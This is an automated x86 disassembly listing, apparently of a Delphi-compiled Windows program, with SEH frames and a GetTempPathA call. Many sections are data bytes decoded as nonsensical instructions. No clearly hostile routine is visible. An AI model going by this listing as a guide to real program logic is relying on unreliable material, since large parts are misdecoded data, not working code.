call sub_45ce20
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_403ea8
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e1e1
lea eax [ ebp - 0x18 ]
call sub_403e54
retn
sub_45e1ec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45e27a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_45ce20
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_403ea8
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e281
lea eax [ ebp - 0x18 ]
call sub_403e54
retn
sub_45e28c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_45e2ac
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_45e306
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ eax + 0x4 ] 0x40
jl r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax + ecx * 4 + 0x8 ] edx
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e30d
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
sub_45e314
push ebp
mov ebp esp
push 0x0
push ebx
xor ecx ecx
push ebp
push sub_45e36e
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
cmp edx [ eax + 0x4 ]
jge r-xdata
mov ebx [ eax + edx * 4 + 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e375
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_45e37c
push ebx
push esi
mov esi [ eax + 0x4 ]
dec esi
test esi esi
jl r-xdata
pop esi
pop ebx
retn
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
dec [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
mov edx [ eax + edx * 4 + 0x8 ]
mov [ eax + ecx * 4 + 0x8 ] edx
mov edx [ eax + 0x4 ]
xor ebx ebx
mov [ eax + edx * 4 + 0x8 ] ebx
pop esi
pop ebx
retn
cmp edx [ eax + ecx * 4 + 0x8 ]
jne r-xdata
sub_45e3b0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_45e451
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax 0x2af9
jne r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_45cef4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e458
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b8
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_408be0
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_403ea8
sub_45e460
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45e499
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e4a0
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_45e4d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45e4f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e4fc
retn
sub_45e72c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45e78b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx 0x104
call sub_4044a0
mov eax [ ebx ]
call sub_404314
push eax
mov eax [ ebx ]
call sub_404114
push eax
call GetTempPathA
mov edx ebx
xchg edx eax
call sub_4044a0
lea edx [ ebp - 0x4 ]
mov eax [ ebx ]
call sub_45e634
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e792
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_45e798
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45e861
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx r-xdata
call sub_404260
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_407a28
mov eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax edi
call sub_407a28
mov eax [ ebp - 0xc ]
pop edx
call [ rw-data ]
mov esi eax
mov edx [ ebx ]
mov eax edi
call sub_404458
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404374
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_403ea8
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e868
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403e78
retn
push ebx
mov eax edi
call sub_404114
mov edx eax
add edx esi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404374
mov eax ebx
call sub_403e54
jmp r-xdata
sub_45e880
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_45e798
mov eax esi
mov edx r-xdata
call sub_404260
jne r-xdata
mov edx [ ebx ]
mov eax esi
call [ rw-data ]
mov edi eax
mov edx [ ebx ]
mov eax esi
call sub_404458
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404374
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_403ea8
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebx
mov eax esi
call sub_404114
mov edx eax
add edx edi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404374
jmp r-xdata
mov eax ebx
call sub_403e54
jmp r-xdata
sub_45e927
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
and ebx [ ebx - 0x6 ]
inc ebx
mov eax eax
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45e9eb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e9f2
retn
mov eax rw-data
call sub_40d078
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_4048dc
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4048dc
mov eax rw-data
call sub_403e54
mov eax rw-data
mov edx [ r-xdata ]
call sub_404e14
mov eax rw-data
mov edx [ r-xdata ]
call sub_404e14
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_4048dc
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4048dc
sub_45e9f4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_45eac7
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45eace
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
lea eax [ ebp - 0x4 ]
call sub_45e72c
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403ea8
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov edx r-xdata
mov cl 0x20
call sub_402c3c
jne r-xdata
mov eax sub_40c23c
mov [ rw-data ] eax
mov [ rw-data ] r-xdata
jmp r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404e08
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403ea8
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404e08
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403ea8
sub_45eb17
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x45eb ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
jmp sub_403858
inc ebx
outsd
insd
jo r-xdata
inc esi
add [ ecx ] al
retn
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x300045eb ] dl
add [ eax ] al
add [ eax ] bh
inc ecx
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax + 0xc004198 ] ah
inc esp
inc ecx
add ah cl
fwait
inc ecx
add [ eax ] ch
inc ebx
inc ecx
add [ esp + ebx * 4 - 0x648fffbf ] ah
inc ecx
add [ esp + ebx * 4 - 0x6253ffbf ] dh
inc ecx
add ah bl
lahf
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ eax + ebx * 4 + 0x41 ] dl
add [ eax ] dl
push esp
dec ecx
inc edx
popad
jae r-xdata
inc eax
add [ eax + 0x70045eb ] ch
adc [ ecx + ecx * 2 + 0x64 ] dl
inc edx
popad
jae r-xdata
push esp
dec ecx
dec ecx
outsb
inc ebx
outsd
insd
jo r-xdata
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
outsb
je r-xdata
jb r-xdata
imul esp [ esi + 0x79 ] 0x6e657645
outsb
outsb
je r-xdata
add [ eax - 0x5fffbfd0 ] bh
cwde
inc ecx
add [ esp + eax * 2 ] cl
jb r-xdata
jo r-xdata
add [ eax ] ecx
pop es
inc ecx
push ebx
outsb
jb r-xdata
je r-xdata
jmp r-xdata
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
or al 0x4f
jb r-xdata
jo r-xdata
push ebx
je r-xdata
dec esi
outsd
je r-xdata
add [ ebp + ebp * 8 + 0x45 ] ah
add [ eax - 0x14 ] bl
inc ebp
add [ eax ] cl
pop ss
push esp
dec ecx
dec ecx
outsb
je r-xdata
push esp
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
outsb
je r-xdata
jmp r-xdata
push esp
in al dx
inc ebp
jo r-xdata
add [ esp + ebx * 4 - 0x10f7ffbf ] ah
or [ edi ] al
inc ebp
add [ esp + ebx * 4 - 0x6253ffbf ] dh
inc ecx
add ah bl
lahf
add [ eax ] cl
out dx eax
popad
insd
arpl [ ebp + 0x70 ] sp
je r-xdata
jns r-xdata
inc ecx
add ah cl
fwait
inc ecx
add [ eax ] ch
inc ebx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
in eax dx
inc ebp
jb r-xdata
add [ eax ] ah
add [ eax ] al
adc al 0xeb
add ah bh
in al dx
jb r-xdata
retn
xor eax eax
mov [ ebx + 0x30 ] eax
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
outsb
inc esp
imul esi [ ebx + 0x63 ] 0x656e6e6f
arpl [ esp + edx * 2 - 0x14 ] si
dec edi
nop
push 0x70045ed
push ss
push esp
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
outsb
je r-xdata
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ esi + ebp * 8 + 0x45 ] ch
add [ eax ] dh
out dx eax
inc ebp
add [ edi + ebp * 8 + 0x45 ] al
add [ edi + ebp * 8 + 0x45 ] dl
add [ eax - 0x11 ] ch
inc ebp
add [ eax - 0x12 ] cl
inc ebp
add [ eax ] ch
out dx al
inc ebp
add [ eax - 0x27ffba12 ] ch
out dx al
inc ebp
add [ esi ] dl
push esp
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
outsb
je r-xdata
add [ ebp + ebx * 4 - 0x6023ffbf ] ch
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x13 ] ch
inc ebp
popad
insd
add [ ebp + ebp * 8 + 0x45 ] ah
add ah bh
push ds
inc ecx
add [ ebp - 0x1303ffc0 ] cl
pop es
push esp
push ebx
je r-xdata
inc ecx
pop es
outsb
jbe r-xdata
jo r-xdata
jo r-xdata
inc ebp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
arpl [ gs : esp + edx * 2 - 0x14 ] si
jb r-xdata
add cl [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
je r-xdata
outsb
inc ebp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp * 8 + 0x45 ] cl
jo r-xdata
push esp
dec ecx
inc ebx
outsd
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax + 0xc004198 ] ah
inc esp
popad
insd
inc ebp
jbe r-xdata
add [ eax ] al
cld
in al dx
inc ebp
add [ ebx + ebp * 8 + 0x60045 ] ah
or ecx [ ecx + 0x64 ]
dec ecx
outsb
je r-xdata
pushad
add [ eax ] al
add [ ebx + ebp * 8 ] dl
je r-xdata
outsb
add [ eax ] 0x0
add [ eax + 0x4f090004 ] al
outsb
push edx
arpl [ gs : ebp + 0x69 ] sp
jbe sub_45ee6c
jb r-xdata
jo r-xdata
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060005 ] al
outsb
push ebx
outsb
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4a ] 0x0
je r-xdata
add al 0x0
adc ah ch
inc ebp
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090002 ] al
outsb
inc ebx
outsd
outsb
outsb
arpl [ gs : eax + edx - 0x14 ] si
inc ebp
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0003 ] al
sub_45ee28
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4a ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_45ee48
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x30 ] esi
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_45ee6c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419854
mov [ esi + 0x38 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_45eea8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx + 0x52 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
push 0x0
push 0x0
mov eax esi
call sub_4159e4
sub_45eed8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
push 0x0
push 0x0
mov eax esi
call sub_4159e4
sub_45ef08
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419b70
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x34 ]
jne r-xdata
xor eax eax
mov [ esi + 0x34 ] eax
sub_45ef7c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45efa1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45efa8
retn
sub_45efb4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45efd9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45efe0
retn
sub_45efec
or [ eax ] eax
add [ eax ] al
or [ esi + eax * 2 ] dh
inc eax
jbe r-xdata
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
add [ esp + esi * 2 ] al
inc esi
add [ eax + 0x76 ] al
inc esi
add [ eax ] al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f07b
mov eax rw-data
mov ecx 0x9
inc [ rw-data ]
jne r-xdata
add [ eax + 0x76 ] al
inc esi
add ah bh
jae r-xdata
add [ eax + 0x76 ] al
inc esi
add al bh
jae r-xdata
mov edx [ r-xdata ]
add [ eax ] al
add [ eax - 0xbffb98a ] ah
jae r-xdata
call sub_4048dc
add [ eax + edi * 2 + 0x73f00046 ] cl
inc esi
add ah ch
je r-xdata
adc [ eax + 0x7b ] ch
add ah ch
jae r-xdata
inc ebp
add bl al
jmp sub_403858
add [ eax ] ch
ja r-xdata
fild [ edi - 0x6 ]
add al ch
jae r-xdata
jmp r-xdata
add [ eax + 0x75 ] ch
inc esi
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
retn
sub_45f0a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45f0cd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f0d4
retn
sub_45f0e0
sub al 0xf1
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 8 + 0x45 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
int1
inc ebp
add [ eax + eax ] ah
add [ eax - 0x3bffba14 ] dh
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add al dl
inc ebp
add [ esp + eax * 2 ] cl
inc ecx
add ah cl
fwait
inc ecx
add [ eax ] ch
inc ebx
inc ecx
add [ ebx + esi * 8 + 0x45 ] bl
add [ eax ] cl
out dx eax
inc ebp
add [ esp + ebx * 4 - 0x6253ffbf ] dh
inc ecx
add ah bl
lahf
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ eax + 0x300045f2 ] dl
out dx eax
inc ebp
add [ edi + ebp * 8 + 0x45 ] al
add [ edi + ebp * 8 + 0x45 ] dl
add [ eax - 0x11 ] ch
inc ebp
add [ edx + esi * 8 ] dh
inc ebp
add [ eax ] al
inc ebp
add [ ebx + esi * 8 + 0x45 ] ch
add [ esi * 8 - 0xdcfffbb ] ch
inc ebp
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax + 0x29 ] al
inc eax
add [ eax - 0xd ] ch
inc ebp
add ah ch
test [ ebp ] 0xa
push esp
dec ecx
dec esp
outsd
inc edx
popad
jae r-xdata
push esp
imul ebp [ ebp + 0x65 ] r-xdata
bound eax [ eax ]
add bh bh
bound eax [ eax ]
add bh bh
nop
movsb [ edi ] [ esi ]
int1
inc ebp
add [ edi ] al
or dl [ ecx + ecx * 2 + 0x64 ]
dec esp
outsd
inc edx
popad
jae r-xdata
je r-xdata
popad
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] al
or edx [ edx + 0x65 ]
jo r-xdata
sub al 0xf1
inc ebp
add [ ebp + ebp * 8 + 0x45 ] ah
add [ ecx ] cl
add [ ecx ] cl
dec ecx
dec esp
outsd
inc edx
popad
jae r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45ee6c
mov [ esi + 0x61 ] 0x1
mov [ esi + 0x62 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
arpl [ ebp + 0x43 ] sp
push edx
dec esp
inc esi
nop
retn
add eax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
add [ fs : eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ esi ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
add [ gs : eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop es
add [ edi ] al
dec esp
outsd
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_45f234
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45f284
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f28b
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov eax ebx
call sub_45ee48
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
sub_45f290
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45ee6c
mov [ esi + 0x61 ] 0x1
mov [ esi + 0x62 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_45f2d0
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4198a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_45f300
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45f350
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f357
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax ebx
call sub_45ee28
sub_45f36c
push ebp
mov ebp esp
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45f4f6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f4fd
lea eax [ ebp - 0x24 ]
mov edx 0x6
call sub_403e78
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
mov edx esi
mov eax ebx
call sub_45eea8
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_416254
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45f4c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov edx esi
mov eax [ ebp - 0xc ]
call sub_415c60
lea eax [ ebp - 0x8 ]
call sub_403e54
cmp [ ebx + 0x61 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x4 ]
call sub_403eec
cmp [ ebx + 0x62 ] 0x0
je r-xdata
call sub_409814
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x8 ]
call sub_40a44c
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403104
retn
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x14 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40c9e0
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_403eec
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x1c ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40c9e0
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
call sub_403eec
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x24 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40c9e0
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x4 ]
call sub_403eec
sub_45f523
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
